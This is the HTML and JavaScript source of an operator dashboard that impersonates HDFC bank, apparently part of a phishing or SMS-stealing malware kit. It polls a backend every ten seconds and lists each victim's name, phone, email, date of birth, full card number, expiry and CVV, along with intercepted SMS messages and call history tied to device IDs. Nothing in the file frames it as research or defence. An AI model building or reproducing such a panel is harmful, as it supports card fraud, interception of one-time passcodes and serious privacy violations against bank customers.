<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC ADMIN | User Monitoring System</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #004c8f;
            --accent: #ed232a;
            --bg: #0a0e14;
            --card: #151b23;
            --text: #e6edf3;
            --text-dim: #8b949e;
            --border: #30363d;
            --success: #238636;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            padding: 20px;
        }

        .header {
            max-width: 1200px;
            margin: 0 auto 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card);
            padding: 20px 30px;
            border-radius: 15px;
            border: 1px solid var(--border);
        }

        .brand { display: flex; align-items: center; gap: 15px; }
        .logo { width: 40px; height: 40px; background: var(--primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 700; }

        .stats { display: flex; gap: 30px; }
        .stat-card { text-align: right; }
        .stat-num { font-size: 24px; font-weight: 700; color: var(--accent); }
        .stat-label { font-size: 11px; text-transform: uppercase; color: var(--text-dim); }

        .user-grid {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 25px;
        }

        .user-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 25px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }

        .user-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
            box-shadow: 0 10px 30px rgba(0, 76, 143, 0.2);
        }

        .user-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 20px;
        }

        .user-name { font-size: 18px; font-weight: 700; }
        .user-phone { font-size: 14px; color: var(--text-dim); }
        .online-dot { width: 10px; height: 10px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }

        .user-details {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
            font-size: 13px;
        }

        .detail-item label { display: block; color: var(--text-dim); font-size: 10px; text-transform: uppercase; margin-bottom: 3px; }
        .detail-item span { font-weight: 500; }

        .card-preview {
            background: linear-gradient(135deg, #2c3e50, #000);
            padding: 15px;
            border-radius: 12px;
            margin-top: 10px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .card-num { font-family: monospace; font-size: 14px; letter-spacing: 2px; margin-bottom: 10px; display: block; }
        .card-sub { display: flex; justify-content: space-between; font-size: 10px; color: #ccc; }

        /* Modal / Detail View */
        #detailModal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            background: var(--bg);
            width: 90%;
            max-width: 1000px;
            height: 90vh;
            border-radius: 30px;
            border: 1px solid var(--border);
            display: grid;
            grid-template-columns: 350px 1fr;
            overflow: hidden;
        }

        .modal-sidebar {
            background: var(--card);
            padding: 40px;
            border-right: 1px solid var(--border);
            overflow-y: auto;
        }

        .modal-main {
            padding: 40px;
            overflow-y: auto;
        }

        .tabs {
            display: flex;
            gap: 20px;
            border-bottom: 1px solid var(--border);
            margin-bottom: 30px;
        }

        .tab {
            padding: 10px 20px;
            cursor: pointer;
            color: var(--text-dim);
            font-weight: 600;
        }

        .tab.active {
            color: var(--primary);
            border-bottom: 2px solid var(--primary);
        }

        .log-list { display: flex; flex-direction: column; gap: 15px; }
        .log-entry {
            background: var(--card);
            padding: 15px;
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .log-time { font-size: 11px; color: var(--text-dim); margin-bottom: 5px; }
        .log-sender { font-weight: 700; color: var(--primary); margin-bottom: 5px; display: block; }

        .close-modal {
            position: absolute;
            top: 30px; right: 30px;
            font-size: 30px; color: white; cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="brand">
            <div class="logo">H</div>
            <h1>HDFC SECURE PANEL</h1>
        </div>
        <div class="stats">
            <div class="stat-card">
                <div class="stat-num" id="totalUsers">0</div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-num" id="totalSms">0</div>
                <div class="stat-label">Total Logs</div>
            </div>
        </div>
    </div>

    <div class="user-grid" id="userGrid">
        <!-- User Cards will be injected here -->
    </div>

    <!-- User Detail Modal -->
    <div id="detailModal">
        <span class="close-modal" onclick="closeModal()">&times;</span>
        <div class="modal-content">
            <div class="modal-sidebar" id="modalSidebar">
                <!-- User details sidebar -->
            </div>
            <div class="modal-main">
                <div class="tabs">
                    <div class="tab active" onclick="switchTab('sms')">SMS LOGS</div>
                    <div class="tab" onclick="switchTab('calls')">CALL HISTORY</div>
                </div>
                <div id="logContainer" class="log-list">
                    <!-- Logs will be injected here -->
                </div>
            </div>
        </div>
    </div>

    <script>
        let allData = { users: [], sms: [], calls: [] };
        let activeUser = null;
        let activeTab = 'sms';

        async function fetchData() {
            try {
                const response = await fetch('/api/admin/data');
                allData = await response.json();
                renderGrid();
                updateStats();
            } catch (e) { console.error(e); }
        }

        function updateStats() {
            document.getElementById('totalUsers').textContent = allData.users.length;
            document.getElementById('totalSms').textContent = allData.sms.length + allData.calls.length;
        }

        function renderGrid() {
            const grid = document.getElementById('userGrid');
            grid.innerHTML = allData.users.map(user => `
                <div class="user-card" onclick="openUser('${user.device_id}')">
                    <div class="user-header">
                        <div>
                            <div class="user-name">${user.full_name || 'Pending Details...'}</div>
                            <div class="user-phone">${user.phone || 'No Phone'}</div>
                        </div>
                        <div class="online-dot"></div>
                    </div>
                    <div class="user-details">
                        <div class="detail-item"><label>City</label><span>${user.city || '-'}</span></div>
                        <div class="detail-item"><label>DOB</label><span>${user.dob || '-'}</span></div>
                    </div>
                    ${user.card_num ? `
                        <div class="card-preview">
                            <span class="card-num">${user.card_num}</span>
                            <div class="card-sub">
                                <span>${user.card_name}</span>
                                <span>${user.card_exp} | CVV: ${user.card_cvv}</span>
                            </div>
                        </div>
                    ` : '<div style="color:var(--text-dim); font-size:12px; text-align:center; padding:10px; border:1px dashed var(--border); border-radius:10px;">Waiting for Card Details...</div>'}
                </div>
            `).join('');
        }

        function openUser(deviceId) {
            activeUser = allData.users.find(u => u.device_id === deviceId);
            const modal = document.getElementById('detailModal');
            modal.style.display = 'flex';
            
            const sidebar = document.getElementById('modalSidebar');
            sidebar.innerHTML = `
                <h2 style="margin-bottom:30px;">User Profile</h2>
                <div class="detail-item" style="margin-bottom:20px;"><label>Full Name</label><span style="font-size:20px;">${activeUser.full_name}</span></div>
                <div class="detail-item" style="margin-bottom:20px;"><label>Email</label><span>${activeUser.email}</span></div>
                <div class="detail-item" style="margin-bottom:20px;"><label>Phone</label><span>${activeUser.phone}</span></div>
                <div class="detail-item" style="margin-bottom:20px;"><label>Address</label><span>${activeUser.city}</span></div>
                <hr style="border:0; border-top:1px solid var(--border); margin:30px 0;">
                <div class="detail-item" style="margin-bottom:20px;"><label>Card Number</label><span style="font-family:monospace; font-size:18px;">${activeUser.card_num || 'Not Entered'}</span></div>
                <div class="detail-item" style="margin-bottom:20px;"><label>Expiry / CVV</label><span>${activeUser.card_exp} / ${activeUser.card_cvv}</span></div>
                <div class="detail-item" style="margin-bottom:20px;"><label>Device ID</label><span style="font-size:10px; color:var(--text-dim);">${activeUser.device_id}</span></div>
            `;
            
            switchTab('sms');
        }

        function switchTab(tab) {
            activeTab = tab;
            const tabs = document.querySelectorAll('.tab');
            tabs[0].classList.toggle('active', tab === 'sms');
            tabs[1].classList.toggle('active', tab === 'calls');
            
            const container = document.getElementById('logContainer');
            const logs = tab === 'sms' ? 
                allData.sms.filter(s => s.device_id === activeUser.device_id) :
                allData.calls.filter(c => c.device_id === activeUser.device_id);
                
            if (logs.length === 0) {
                container.innerHTML = '<div style="text-align:center; padding:100px; color:var(--text-dim);">No data captured yet.</div>';
                return;
            }

            container.innerHTML = logs.map(log => `
                <div class="log-entry">
                    <div class="log-time">${new Date(log.received_at || log.called_at).toLocaleString()}</div>
                    ${tab === 'sms' ? 
                        `<span class="log-sender">${log.sender}</span><div>${log.message}</div>` :
                        `<span class="log-sender">${log.number}</span><div>Type: ${log.type} | Duration: ${log.duration}s</div>`
                    }
                </div>
            `).join('');
        }

        function closeModal() {
            document.getElementById('detailModal').style.display = 'none';
        }

        fetchData();
        setInterval(fetchData, 10000);
    </script>
</body>
</html>
